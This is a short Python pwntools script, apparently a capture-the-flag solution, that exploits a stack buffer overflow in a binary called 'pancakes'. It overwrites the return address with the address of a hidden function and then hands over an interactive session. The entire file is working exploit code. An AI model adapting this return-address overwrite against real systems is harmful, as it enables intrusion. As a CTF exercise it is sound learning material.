#!/usr/bin/env python3

from pwn import *

OVERFLOW_OFFSET = 152
SECRET_RECIPE_ADDRESS = 0x000000000040098b

HOST = 'jh2i.com'
PORT = 50021
ELF_PATH = './pancakes'

# p = remote(HOST, PORT)
p = process(ELF_PATH)

print(p.recv(1024).decode('latin-1'))

# The pwn.fit() function creates the payload
# by appending the address with as many characters as specified by the offset:
payload = fit({OVERFLOW_OFFSET: p64(SECRET_RECIPE_ADDRESS)})

log.progress(f'Sending payload {payload.decode("latin-1")} ...')

p.sendline(payload)

p.interactive()
